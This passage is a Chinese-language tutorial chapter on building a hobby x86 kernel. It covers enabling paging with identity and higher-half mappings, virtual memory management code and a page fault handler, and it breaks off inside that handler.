<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;console.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;debug.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;gdt.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;idt.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;timer.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pmm.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;vmm.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 内核初始化函数</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">kern_init</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 开启分页机制后的multiboot指针</span></span><br><span class="line"><span class="type">multiboot_t</span> *glb_mboot_ptr;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 开启分页机制后的内核栈</span></span><br><span class="line"><span class="type">char</span> kern_stack[STACK_SIZE];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 内核使用的临时页表和页目录</span></span><br><span class="line"><span class="comment">// 该地址必须是页对齐的地址，内存 0−640KB 肯定是空闲的</span></span><br><span class="line"></span><br><span class="line">__attribute__((section(<span class="string">&quot;.init.data&quot;</span>))) <span class="type">pgd_t</span> *pgd_tmp = (<span class="type">pgd_t</span> *)<span class="number">0x1000</span>;</span><br><span class="line">__attribute__((section(<span class="string">&quot;.init.data&quot;</span>))) <span class="type">pgd_t</span> *pte_low = (<span class="type">pgd_t</span> *)<span class="number">0x2000</span>;</span><br><span class="line">__attribute__((section(<span class="string">&quot;.init.data&quot;</span>))) <span class="type">pgd_t</span> *pte_hign = (<span class="type">pgd_t</span> *)<span class="number">0x3000</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 内核入口函数</span></span><br><span class="line">__attribute__((section(<span class="string">&quot;.init.text&quot;</span>))) <span class="type">void</span> <span class="title function_">kern_entry</span><span class="params">()</span>&#123;</span><br><span class="line">    pgd_tmp[<span class="number">0</span>] = (<span class="type">uint32_t</span>)pte_low | PAGE_PRESENT | PAGE_WRITE;</span><br><span class="line">	pgd_tmp[PGD_INDEX(PAGE_OFFSET)] = (<span class="type">uint32_t</span>)pte_hign | PAGE_PRESENT | PAGE_WRITE;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 映射内核虚拟地址 4MB 到物理地址的前 4MB</span></span><br><span class="line">	<span class="type">int</span> i;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">1024</span>; i++) &#123;</span><br><span class="line">		pte_low[i] = (i &lt;&lt; <span class="number">12</span>) | PAGE_PRESENT | PAGE_WRITE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 映射 0x00000000-0x00400000 的物理地址到虚拟地址 0xC0000000-0xC0400000</span></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">1024</span>; i++) &#123;</span><br><span class="line">		pte_hign[i] = (i &lt;&lt; <span class="number">12</span>) | PAGE_PRESENT | PAGE_WRITE;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 设置临时页表</span></span><br><span class="line">	<span class="keyword">asm</span> <span class="title function_">volatile</span> <span class="params">(<span class="string">&quot;mov %0, %%cr3&quot;</span> : : <span class="string">&quot;r&quot;</span> (pgd_tmp))</span>;</span><br><span class="line"></span><br><span class="line">	<span class="type">uint32_t</span> cr0;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 启用分页，将 cr0 寄存器的分页位置为 1 就好</span></span><br><span class="line">	<span class="keyword">asm</span> <span class="title function_">volatile</span> <span class="params">(<span class="string">&quot;mov %%cr0, %0&quot;</span> : <span class="string">&quot;=r&quot;</span> (cr0))</span>;</span><br><span class="line">	cr0 |= <span class="number">0x80000000</span>; <span class="comment">// 1000 0000 0000 0000 0000 0000 0000 0000</span></span><br><span class="line">	<span class="keyword">asm</span> <span class="title function_">volatile</span> <span class="params">(<span class="string">&quot;mov %0, %%cr0&quot;</span> : : <span class="string">&quot;r&quot;</span> (cr0))</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 切换内核栈</span></span><br><span class="line">	<span class="type">uint32_t</span> kern_stack_top = ((<span class="type">uint32_t</span>)kern_stack + STACK_SIZE) &amp; <span class="number">0xFFFFFFF0</span>;</span><br><span class="line">	<span class="keyword">asm</span> <span class="title function_">volatile</span> <span class="params">(<span class="string">&quot;mov %0, %%esp\n\t&quot;</span></span></span><br><span class="line"><span class="params">			<span class="string">&quot;xor %%ebp, %%ebp&quot;</span> : : <span class="string">&quot;r&quot;</span> (kern_stack_top))</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 更新全局 multiboot_t 指针</span></span><br><span class="line">	glb_mboot_ptr = mboot_ptr_tmp + PAGE_OFFSET;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 调用内核初始化函数</span></span><br><span class="line">	kern_init();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">kern_init</span><span class="params">()</span>&#123;</span><br><span class="line">    init_debug();</span><br><span class="line">    init_gdt();</span><br><span class="line">    init_idt();</span><br><span class="line"></span><br><span class="line">    console_clear();</span><br><span class="line">	<span class="comment">//console_write_color(&quot;Hello, OS kernel!\n&quot;, rc_black, rc_green);</span></span><br><span class="line">    <span class="comment">//panic(&quot;test&quot;);</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    printk_color(rc_black, rc_green, <span class="string">&quot;Hello OS!!!\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    init_timer(<span class="number">200</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// `sti` 指令的作用是设置中断标志（Set Interrupt Flag）</span></span><br><span class="line">    <span class="comment">// asm volatile(&quot;sti&quot;);</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 显示物理内存布局</span></span><br><span class="line">    printk(<span class="string">&quot;kernel in memory start: 0x%08X\n&quot;</span>, kern_start);</span><br><span class="line">    printk(<span class="string">&quot;kernel in memory end: 0x%08X\n&quot;</span>, kern_end);</span><br><span class="line">    printk(<span class="string">&quot;kernel in memory used: %d KB\n\n&quot;</span>, (kern_end - kern_start + <span class="number">1023</span>) / <span class="number">1024</span>); <span class="comment">// 换算成kb</span></span><br><span class="line"></span><br><span class="line">    show_memory_map();</span><br><span class="line">    <span class="comment">// 初始化物理内存管理</span></span><br><span class="line">    init_pmm();</span><br><span class="line"></span><br><span class="line">    printk_color(rc_black, rc_red, <span class="string">&quot;\nThe Count of Physical Memory Page is: %u\n\n&quot;</span>, phy_page_count); <span class="comment">// 栈中分配的物理也的大小</span></span><br><span class="line">    <span class="type">uint32_t</span> allc_addr = <span class="literal">NULL</span>;</span><br><span class="line">    printk_color(rc_black, rc_light_brown , <span class="string">&quot;Test Physical Memory Alloc :\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    allc_addr = pmm_alloc_page(); <span class="comment">// 分配一个页 物理内存</span></span><br><span class="line">    printk_color(rc_black, rc_light_brown , <span class="string">&quot;Alloc Physical Addr: 0x%08X\n&quot;</span>,allc_addr);</span><br><span class="line">    allc_addr = pmm_alloc_page();</span><br><span class="line">    printk_color(rc_black, rc_light_brown , <span class="string">&quot;Alloc Physical Addr: 0x%08X\n&quot;</span>,allc_addr);</span><br><span class="line">    allc_addr = pmm_alloc_page();</span><br><span class="line">    printk_color(rc_black, rc_light_brown , <span class="string">&quot;Alloc Physical Addr: 0x%08X\n&quot;</span>,allc_addr);</span><br><span class="line">    allc_addr = pmm_alloc_page();</span><br><span class="line">    printk_color(rc_black, rc_light_brown , <span class="string">&quot;Alloc Physical Addr: 0x%08X\n&quot;</span>,allc_addr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;hlt&quot;</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>解析：</strong></p>
<p> <code>__attribute__((section(&quot;.init.data&quot;)))</code> 是GCC编译器的扩展功能， 用来指定变量或者函数的存储区段。</p>
<blockquote>
<ul>
<li>将虚拟地址 <code>0xC0000000</code>（高端虚拟地址，通常对应于内核的虚拟地址空间）开始的 4MB 映射到物理地址 <code>0-4MB</code>。</li>
<li>同时将虚拟地址 <code>0-4MB</code> 直接映射到物理地址 <code>0-4MB</code>。这称为“<strong>恒等映射”（identity mapping）。</strong></li>
</ul>
<p>理解：</p>
<ul>
<li>当启用分页（通过将 <code>CR0</code> 寄存器的最高位置为 1）时，CPU <em><strong>立即</strong></em>开始按照分页机制来进行内存寻址。</li>
<li>如果没有进行恒等映射，CPU 将无法正确地执行当前正在运行的代码，因为这些代码在启用分页之前是以物理地址方式访问内存的。</li>
<li>在启用分页之前，<code>kern_entry</code> 函数及其调用的代码是按物理地址访问的。</li>
<li>一旦启用分页，所有内存访问都将基于页表进行。为了确保在切换过程中代码可以继续运行，必须保证这些地址的映射是正确的</li>
</ul>
</blockquote>
<p><strong>也就是说 当CR0 最高位置1 的时候也就是 启动分页时，这之前都运行在物理内存，一旦启用分页将会立马切换到分页模式，为了保证当前代码能够顺利进行，也会将物理的地址的0-4MB 同时映射到 虚拟地址的0-4MB 和  虚拟地址的高端地址 0xC0000000的4MB上</strong>，低端恒等映射的主要目的是确保在分页机制切换过程中，所有正在执行的代码地址依旧有效。</p>
<blockquote>
<p>include&#x2F;multiboot.h 更新声明</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 声明全局的 multiboot_t * 指针</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">multiboot_t</span> *glb_mboot_ptr;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 声明全局的multiboot 指针</span></span><br><span class="line"><span class="comment">// 内核未建立分页机制前缓存的指针</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">multiboot_t</span> *mboot_ptr_tmp;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>drivers&#x2F;console.c 修改文本模式下显存的起始位置，原先的地址0xB8000 加上偏移地址 0xC0000000 才能在分页模式下访问到</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;vmm.h&quot;</span></span></span><br><span class="line"><span class="comment">// VGA 的显示缓冲的起点 0xB8000 需要加上分页地址</span></span><br><span class="line"><span class="type">static</span> <span class="type">uint16_t</span> *video_memory = (<span class="type">uint16_t</span> *)(<span class="number">0xB8000</span> + PAGE_OFFSET);</span><br></pre></td></tr></table></figure>

<blockquote>
<p>kern&#x2F;debug&#x2F;elf.c 低端内存地址 也需要更改  libs&#x2F;elf.c</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">elf_t</span> <span class="title function_">elf_from_multiboot</span><span class="params">(<span class="type">multiboot_t</span> *mb)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> i;</span><br><span class="line">	<span class="type">elf_t</span> elf;</span><br><span class="line">	<span class="type">elf_section_header_t</span> *sh = (<span class="type">elf_section_header_t</span>*)mb-&gt;addr;</span><br><span class="line"></span><br><span class="line">	<span class="type">uint32_t</span> shstrtab = sh[mb-&gt;shndx].addr;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; mb-&gt;num; i++) &#123;</span><br><span class="line">		<span class="type">const</span> <span class="type">char</span> *name = (<span class="type">const</span> <span class="type">char</span> *)(shstrtab + sh[i].name) + PAGE_OFFSET;</span><br><span class="line">		<span class="comment">// 在 GRUB 提供的 multiboot 信息中寻找内核 ELF 格式所提取的字符串表和符号表</span></span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">strcmp</span>(name, <span class="string">&quot;.strtab&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">			elf.strtab = (<span class="type">const</span> <span class="type">char</span> *)sh[i].addr + PAGE_OFFSET;</span><br><span class="line">			elf.strtabsz = sh[i].size;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">strcmp</span>(name, <span class="string">&quot;.symtab&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">			elf.symtab = (<span class="type">elf_symbol_t</span>*)(sh[i].addr + PAGE_OFFSET);</span><br><span class="line">			elf.symtabsz = sh[i].size;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> elf;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<blockquote>
<p>mm&#x2F;vmm.c  虚拟内存管理的初始化</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;idt.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;string.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;debug.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;vmm.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pmm.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 内核页目录区域</span></span><br><span class="line"><span class="type">pgd_t</span> pgd_kern[PGD_SIZE] __attribute__ ((aligned(PAGE_SIZE)));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 内核页表区域</span></span><br><span class="line"><span class="type">static</span> <span class="type">pte_t</span> pte_kern[PTE_COUNT][PTE_SIZE] __attribute__ ((aligned(PAGE_SIZE)));</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init_vmm</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// 0xC0000000 这个地址在页目录的索引</span></span><br><span class="line">	<span class="type">uint32_t</span> kern_pte_first_idx = PGD_INDEX(PAGE_OFFSET);</span><br><span class="line">	</span><br><span class="line">	<span class="type">uint32_t</span> i, j;</span><br><span class="line">	<span class="keyword">for</span> (i = kern_pte_first_idx, j = <span class="number">0</span>; i &lt; PTE_COUNT + kern_pte_first_idx; i++, j++) &#123;</span><br><span class="line">		<span class="comment">// 此处是内核虚拟地址，MMU 需要物理地址，所以减去偏移，下同</span></span><br><span class="line">		pgd_kern[i] = ((<span class="type">uint32_t</span>)pte_kern[j] - PAGE_OFFSET) | PAGE_PRESENT | PAGE_WRITE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="type">uint32_t</span> *pte = (<span class="type">uint32_t</span> *)pte_kern;</span><br><span class="line">	<span class="comment">// 不映射第 0 页，便于跟踪 NULL 指针</span></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; PTE_COUNT * PTE_SIZE; i++) &#123;</span><br><span class="line">		pte[i] = (i &lt;&lt; <span class="number">12</span>) | PAGE_PRESENT | PAGE_WRITE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="type">uint32_t</span> pgd_kern_phy_addr = (<span class="type">uint32_t</span>)pgd_kern - PAGE_OFFSET;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 注册页错误中断的处理函数 ( 14 是页故障的中断号 )</span></span><br><span class="line">	register_interrupt_handler(<span class="number">14</span>, &amp;page_fault);</span><br><span class="line"></span><br><span class="line">	switch_pgd(pgd_kern_phy_addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">switch_pgd</span><span class="params">(<span class="type">uint32_t</span> pd)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">asm</span> <span class="title function_">volatile</span> <span class="params">(<span class="string">&quot;mov %0, %%cr3&quot;</span> : : <span class="string">&quot;r&quot;</span> (pd))</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">map</span><span class="params">(<span class="type">pgd_t</span> *pgd_now, <span class="type">uint32_t</span> va, <span class="type">uint32_t</span> pa, <span class="type">uint32_t</span> flags)</span></span><br><span class="line">&#123; 	</span><br><span class="line">	<span class="type">uint32_t</span> pgd_idx = PGD_INDEX(va);</span><br><span class="line">	<span class="type">uint32_t</span> pte_idx = PTE_INDEX(va); </span><br><span class="line">	</span><br><span class="line">	<span class="type">pte_t</span> *pte = (<span class="type">pte_t</span> *)(pgd_now[pgd_idx] &amp; PAGE_MASK);</span><br><span class="line">	<span class="keyword">if</span> (!pte) &#123;</span><br><span class="line">		pte = (<span class="type">pte_t</span> *)pmm_alloc_page();</span><br><span class="line">		pgd_now[pgd_idx] = (<span class="type">uint32_t</span>)pte | PAGE_PRESENT | PAGE_WRITE;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 转换到内核线性地址并清 0</span></span><br><span class="line">		pte = (<span class="type">pte_t</span> *)((<span class="type">uint32_t</span>)pte + PAGE_OFFSET);</span><br><span class="line">		bzero(pte, PAGE_SIZE);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">// 转换到内核线性地址</span></span><br><span class="line">		pte = (<span class="type">pte_t</span> *)((<span class="type">uint32_t</span>)pte + PAGE_OFFSET);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	pte[pte_idx] = (pa &amp; PAGE_MASK) | flags;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 通知 CPU 更新页表缓存</span></span><br><span class="line">	<span class="keyword">asm</span> <span class="title function_">volatile</span> <span class="params">(<span class="string">&quot;invlpg (%0)&quot;</span> : : <span class="string">&quot;a&quot;</span> (va))</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">unmap</span><span class="params">(<span class="type">pgd_t</span> *pgd_now, <span class="type">uint32_t</span> va)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">uint32_t</span> pgd_idx = PGD_INDEX(va);</span><br><span class="line">	<span class="type">uint32_t</span> pte_idx = PTE_INDEX(va);</span><br><span class="line"></span><br><span class="line">	<span class="type">pte_t</span> *pte = (<span class="type">pte_t</span> *)(pgd_now[pgd_idx] &amp; PAGE_MASK);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!pte) &#123;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 转换到内核线性地址</span></span><br><span class="line">	pte = (<span class="type">pte_t</span> *)((<span class="type">uint32_t</span>)pte + PAGE_OFFSET);</span><br><span class="line"></span><br><span class="line">	pte[pte_idx] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 通知 CPU 更新页表缓存</span></span><br><span class="line">	<span class="keyword">asm</span> <span class="title function_">volatile</span> <span class="params">(<span class="string">&quot;invlpg (%0)&quot;</span> : : <span class="string">&quot;a&quot;</span> (va))</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">get_mapping</span><span class="params">(<span class="type">pgd_t</span> *pgd_now, <span class="type">uint32_t</span> va, <span class="type">uint32_t</span> *pa)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">uint32_t</span> pgd_idx = PGD_INDEX(va);</span><br><span class="line">	<span class="type">uint32_t</span> pte_idx = PTE_INDEX(va);</span><br><span class="line"></span><br><span class="line">	<span class="type">pte_t</span> *pte = (<span class="type">pte_t</span> *)(pgd_now[pgd_idx] &amp; PAGE_MASK);</span><br><span class="line">	<span class="keyword">if</span> (!pte) &#123;</span><br><span class="line">	      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 转换到内核线性地址</span></span><br><span class="line">	pte = (<span class="type">pte_t</span> *)((<span class="type">uint32_t</span>)pte + PAGE_OFFSET);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 如果地址有效而且指针不为NULL，则返回地址</span></span><br><span class="line">	<span class="keyword">if</span> (pte[pte_idx] != <span class="number">0</span> &amp;&amp; pa) &#123;</span><br><span class="line">		 *pa = pte[pte_idx] &amp; PAGE_MASK;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>__attribute__ ((aligned(PAGE_SIZE)))</code> 是GCC的扩展指令，功能是使得变量的起始地址按照某个数值 对齐，所以我们轻轻松松的就解决了这个难题。</p>
<blockquote>
<p>include&#x2F;vmm.h</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> INCLUDE_VMM_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INCLUDE_VMM_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;idt.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;vmm.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 内核的偏移地址</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_OFFSET 0xC0000000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">12 * P−− 位 0 是存在 (Present) 标志，用于指明表项对地址转换是否有效。</span></span><br><span class="line"><span class="comment">13 * P = 1 表示有效； P = 0 表示无效。</span></span><br><span class="line"><span class="comment">14 * 在页转换过程中，如果说涉及的页目录或页表的表项无效，则会导致一个异常。</span></span><br><span class="line"><span class="comment">15 * 如果 P = 0 ，那么除表示表项无效外，其余位可供程序自由使用。</span></span><br><span class="line"><span class="comment">16 * 例如，操作系统可以使用这些位来保存已存储在磁盘上的页面的序号。</span></span><br><span class="line"><span class="comment">17 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_PRESENT 0x1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">21 * R/W −− 位 1 是读 / 写 (Read/Write) 标志。如果等于 1 ，表示页面可以被读、写或执行。</span></span><br><span class="line"><span class="comment">22 * 如果为 0 ，表示页面只读或可执行。</span></span><br><span class="line"><span class="comment">23 * 当处理器运行在超级用户特权级（级别 0,1 或） 2 时，则 R/W 位不起作用。</span></span><br><span class="line"><span class="comment">24 * 页目录项中的 R/W 位对其所映射的所有页面起作用。</span></span><br><span class="line"><span class="comment">25 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_WRITE 0x2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">29 * U/S −− 位 2 是用户 / 超级用户 (User/Supervisor) 标志。</span></span><br><span class="line"><span class="comment">30 * 如果为 1 ，那么运行在任何特权级上的程序都可以访问该页面。</span></span><br><span class="line"><span class="comment">31 * 如果为 0 ，那么页面只能被运行在超级用户特权级 (0,1 或 2) 上的程序访问。</span></span><br><span class="line"><span class="comment">32 * 页目录项中的 U/S 位对其所映射的所有页面起作用。</span></span><br><span class="line"><span class="comment">33 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_USER 0x4</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 虚拟分页的大学 4KB</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SIZE 4096</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 页掩犸</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_MASK 0xFFFFF000</span></span><br><span class="line"><span class="comment">// 获取一个地址的页目录项 右移动22</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PGD_INDEX(x) (((x) &gt;&gt; 22) &amp; 0x3FF)</span></span><br><span class="line"><span class="comment">// 获取一个地址的页目录项</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PGD_INDEX(x) (((x) &gt;&gt; 22) &amp; 0x3FF)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取一个地址的页表项</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTE_INDEX(x) (((x) &gt;&gt; 12) &amp; 0x3FF)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取一个地址的页內偏移</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OFFSET_INDEX(x) ((x) &amp; 0xFFF)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 页目录数据类型</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">uint32_t</span> <span class="type">pgd_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 页表数据类型</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">uint32_t</span> <span class="type">pte_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 页表成员数</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PGD_SIZE (PAGE_SIZE/sizeof(pte_t))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 页表成员数</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTE_SIZE (PAGE_SIZE/sizeof(uint32_t))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 映射 512MB 内存所需要的页表数</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTE_COUNT 128</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 内核页目录区域</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">pgd_t</span> pgd_kern[PGD_SIZE];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化虚拟内存管理</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">init_vmm</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 更换当前的页目录</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">switch_pgd</span><span class="params">(<span class="type">uint32_t</span> pd)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用 flags 指出的页权限，把物理地址 pa 映射到虚拟地址 va</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">map</span><span class="params">(<span class="type">pgd_t</span> *pgd_now, <span class="type">uint32_t</span> va, <span class="type">uint32_t</span> pa, <span class="type">uint32_t</span> flags)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 取消虚拟地址 va 的物理映射</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">unmap</span><span class="params">(<span class="type">pgd_t</span> *pgd_now, <span class="type">uint32_t</span> va)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果虚拟地址 va 映射到物理地址则返回 1</span></span><br><span class="line"><span class="comment">// 同时如果 pa 不是空指针则把物理地址写入 pa 参数</span></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">get_mapping</span><span class="params">(<span class="type">pgd_t</span> *pgd_now, <span class="type">uint32_t</span> va, <span class="type">uint32_t</span> *pa)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 页错误中断的函数处理</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">page_fault</span><span class="params">(pt_regs *regs)</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// INCLUDE</span></span></span><br></pre></td></tr></table></figure>



<p>**当cpu 进入分页模式，一旦发生内存访问的页错误，就会产生14号中断 **</p>
<blockquote>
<p>mm&#x2F;page_fault.c 14号中断处理函数</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;vmm.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;debug.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">page_fault</span><span class="params">(pt_regs *regs)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">uint32_t</span> cr2;</span><br><span class="line">	<span class="keyword">asm</span> <span class="title function_">volatile</span> <span class="params">(<span class="string">&quot;mov %%cr2, %0&quot;</span> : <span class="string">&quot;=r&quot;</span> (cr2))</span>;</span><br><span class="line"></span><br><span class="line">	printk(<span class="string">&quot;Page fault at 0x%x, virtual faulting address 0x%x\n&quot;</span>, regs-&gt;eip, cr2);</span><br><span class="line">	printk(<span class="string">&quot;Error code: %x\n&quot;</span>, regs-&gt;err_code);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// bit 0 为 0 指页面不存在内存里</span></span><br><span class="line">	<span class="keyword">if</span> ( !(regs-&gt;err_code &amp; <span class="number">0x1</span>)) &#123;</span><br><span class="line">		printk_color(rc_black, rc_red, <span class="string">&quot;Because the page wasn&#x27;t present.\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// bit 1 为 0 表示读错误，为 1 为写错误</span></span><br><span class="line">	<span class="keyword">if</span> (regs-&gt;err_code &amp; <span 